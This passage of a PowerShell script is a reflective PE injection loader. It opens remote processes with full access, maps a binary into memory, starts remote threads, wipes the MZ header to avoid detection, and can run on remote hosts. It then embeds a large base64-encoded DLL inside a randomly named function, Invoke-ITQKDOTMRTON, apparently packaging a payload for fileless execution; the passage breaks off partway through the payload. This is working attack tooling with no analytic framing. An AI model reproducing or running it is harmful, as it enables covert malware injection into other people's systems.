				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}

				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}

				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}


		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null


		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants

		$RemoteProcHandle = [IntPtr]::Zero


		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}









		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}

			Write-Verbose "Got the handle for the remote process to inject in to"
		}



		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}

		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1]



		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{



	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {

				    }
					else
					{
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
					}
	            }
	        }



		}

		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{

			}
			else{
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle


			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
			}
		}



		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{

		}
		else
		{






		}

		Write-Verbose "Done!"
	}

	Main
}


Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}

	Write-Verbose "PowerShell ProcessID: $PID"


	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

	if (-not $DoNotZeroMZ) {


		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}


	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}

function Invoke-ITQKDOTMRTON
{

$PEBytes32 = "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AABoYPAAEOgtPQAAg8RQxkXPAI1FwFBqBGoEaFwKAABoYPAAEOgPPQAAjUXIxkXEAFBXag9o+QEAAGhg8AAQ6PU8AACNRfzGRcsAiYX0/v//M/+NRezHhfz+//+nEQAQiYUA////R41F6MeFCP///4gRABCJhQz///+NReSJhRj///+NReCJhST///+NRdxqBVmJhTD///+NRdhqAlqJhTz///+NRdSJhUj///+NRdBqBomVNP///4mVQP///1qJhVT///+NRbCJjfj+//+JjQT///+JjRD////HhRT///9kEgAQx4Uc////BgAAAMeFIP///34QABCJvSj////HhSz///8ZEwAQx4U4////BBIAEMeFRP///zQSABCJjUz////HhVD///+REAAQiZVY////x4Vc////FhEAEImFYP///41FqImFbP///41FzImFeP///41FwIlFhI1FyIlFkI2F9P7//2oOUFaJjWT////HhWj///8pEQAQiY1w////x4V0////aREAEImNfP///8dFgNYQABCJVYjHRYzDEAAQiVWUx0WYaxAAEOhjRAAA/3W8i/CNhcT+//9Q6HagAABT6CEpAACDxECF9nUHM8DptAIAAOjJCQAAoxTZARC7YPAAEI1F8FBqCGoNaOMEAABT6EI7AAAzwGaJRfiNRZxQaghqBmhdBAAAU+gpOwAAM8BmiUWkjYXo/v//UGoKagtoVAkAAFPoDTsAADPAUGogaADYARBmiYXy/v//6FQ6AACDxEijDNkBEOg1LwAAoxDZARCFwHUPjUXwUOjaPgAAWaMQ2QEQ6DEDAACjCNkBEOhLMAAAoxjZARCFwHUPjUXwUOizPgAAWaMY2QEQ6JUrAACjHNkBEIXAdQ+NRfBQ6JY+AABZoxzZARDo5CwAAKMg2QEQhcB1D41F8FDoeT4AAFmjINkBEOjjLQAAoyTZARCFwHUPjUXwUOhcPgAAWaMk2QEQ6OYwAACFwI2V6P7//41NnA9EylHoPT4AAFmjKNkBEOhCLwAAoyzZARCFwHUPjUXwUOggPgAAWaMs2QEQjUW4UOhDKwAAa024FovwagBRVuhdOQAAVqMw2QEQ6KQnAADoVzEAAPfYG8CD4OqDwFajgNkBEOjQBgAA6LUHAADoOgUAAI2FtP7//1BqDGoEaOoFAABT6Lw5AAAzwGaJhcD+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